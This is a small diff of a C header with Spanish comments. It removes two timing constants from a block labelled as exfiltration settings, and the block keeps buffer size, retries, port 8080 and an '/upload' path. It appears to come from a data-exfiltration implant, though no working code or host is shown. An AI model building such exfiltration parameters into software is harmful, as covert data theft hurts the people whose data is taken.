@@ -44,8 +44,6 @@
 
 // Constantes de exfiltración
 #define EXFIL_BUFFER_SIZE 8192
-#define EXFIL_INTERVAL_MIN 60    // Segundos mínimo entre envíos (60 seg para testing)
-#define EXFIL_INTERVAL_MAX 60    // Segundos máximo (sin jitter, envío fijo)
 #define EXFIL_MAX_RETRIES 3
 #define EXFIL_DEFAULT_PORT "8080"
 #define EXFIL_DEFAULT_PATH "/upload"
